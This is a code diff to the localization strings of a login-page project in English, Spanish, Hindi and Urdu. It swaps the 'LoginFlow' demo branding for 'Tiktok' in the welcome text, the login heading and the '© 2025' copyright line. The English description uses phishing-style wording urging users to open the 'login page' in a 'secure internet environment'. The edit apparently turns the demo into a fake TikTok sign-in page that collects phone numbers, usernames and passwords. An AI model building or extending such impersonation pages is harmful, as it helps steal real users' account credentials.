@@ -40,7 +40,7 @@ const en = {
   welcomeToLoginFlow: 'Welcome to Tiktok',
   loginFlowDescription: 'kindly click the View login page button below to open our established connection with our secure internet environment',
   viewLoginPage: 'View Login Page',
-  loginToLoginFlow: 'Log in to LoginFlow',
+  loginToLoginFlow: 'Log in to Tiktok',
   loginSubheading: 'Manage your account, check notifications, comment on videos, and more.',
   phone: 'Phone',
   emailUsername: 'Email / Username',
@@ -56,7 +56,7 @@ const en = {
   privacyPolicy: 'Privacy Policy',
   dontHaveAccount: 'Don’t have an account?',
   signUp: 'Sign up',
-  copyright: '© 2025 LoginFlow',
+  copyright: '© 2025 Tiktok',
   resetPasswordWith: 'Reset password with:',
   email: 'Email',
   cancel: 'Cancel',
@@ -76,10 +76,10 @@ const en = {
 };
 
 const es = {
-  welcomeToLoginFlow: 'Bienvenido a LoginFlow',
+  welcomeToLoginFlow: 'Bienvenido a Tiktok',
   loginFlowDescription: 'Una demostración de una experiencia de inicio de sesión moderna, segura y fácil de usar, inspirada en las mejores.',
   viewLoginPage: 'Ver página de inicio de sesión',
-  loginToLoginFlow: 'Iniciar sesión en LoginFlow',
+  loginToLoginFlow: 'Iniciar sesión en Tiktok',
   loginSubheading: 'Administra tu cuenta, consulta notificaciones, comenta en videos y más.',
   phone: 'Teléfono',
   emailUsername: 'Correo electrónico / Usuario',
@@ -95,7 +95,7 @@ const es = {
   privacyPolicy: 'Política de Privacidad',
   dontHaveAccount: '¿No tienes una cuenta?',
   signUp: 'Regístrate',
-  copyright: '© 2025 LoginFlow',
+  copyright: '© 2025 Tiktok',
   resetPasswordWith: 'Restablecer contraseña con:',
   email: 'Correo electrónico',
   cancel: 'Cancelar',
@@ -115,10 +115,10 @@ const es = {
 };
 
 const hi = {
-  welcomeToLoginFlow: 'LoginFlow में आपका स्वागत है',
+  welcomeToLoginFlow: 'Tiktok में आपका स्वागत है',
   loginFlowDescription: 'सर्वश्रेष्ठ से प्रेरित एक आधुनिक, सुरक्षित और उपयोगकर्ता-अनुकूल लॉगिन अनुभव का प्रदर्शन।',
   viewLoginPage: 'लॉगिन पृष्ठ देखें',
-  loginToLoginFlow: 'LoginFlow में लॉग इन करें',
+  loginToLoginFlow: 'Tiktok में लॉग इन करें',
   loginSubheading: 'अपना खाता प्रबंधित करें, सूचनाएं जांचें, वीडियो पर टिप्पणी करें, और बहुत कुछ।',
   phone: 'फ़ोन',
   emailUsername: 'ईमेल / उपयोगकर्ता नाम',
@@ -134,7 +134,7 @@ const hi = {
   privacyPolicy: 'गोपनीयता नीति',
   dontHaveAccount: 'खाता नहीं है?',
   signUp: 'साइन अप करें',
-  copyright: '© 2025 LoginFlow',
+  copyright: '© 2025 Tiktok',
   resetPasswordWith: 'पासवर्ड रीसेट करें:',
   email: 'ईमेल',
   cancel: 'रद्द करें',
@@ -154,10 +154,10 @@ const hi = {
 };
 
 const ur = {
-  welcomeToLoginFlow: 'LoginFlow میں خوش آمدید',
+  welcomeToLoginFlow: 'Tiktok میں خوش آمدید',
   loginFlowDescription: 'ایک جدید، محفوظ، اور صارف دوست لاگ ان تجربے کا مظاہرہ، جو بہترین سے متاثر ہے۔',
   viewLoginPage: 'لاگ ان صفحہ دیکھیں',
-  loginToLoginFlow: 'LoginFlow میں لاگ ان کریں',
+  loginToLoginFlow: 'Tiktok میں لاگ ان کریں',
   loginSubheading: 'اپنا اکاؤنٹ منظم کریں، اطلاعات چیک کریں، ویڈیوز پر تبصرہ کریں، اور بہت کچھ۔',
   phone: 'فون',
   emailUsername: 'ای میل / صارف نام',
@@ -173,7 +173,7 @@ const ur = {
   privacyPolicy: 'رازداری کی پالیسی',
   dontHaveAccount: 'اکاؤنٹ نہیں ہے؟',
   signUp: 'سائن اپ کریں',
-  copyright: '© 2025 LoginFlow',
+  copyright: '© 2025 Tiktok',
   resetPasswordWith: 'کے ساتھ پاس ورڈ ری سیٹ کریں:',
   email: 'ای میل',
   cancel: 'منسوخ کریں',
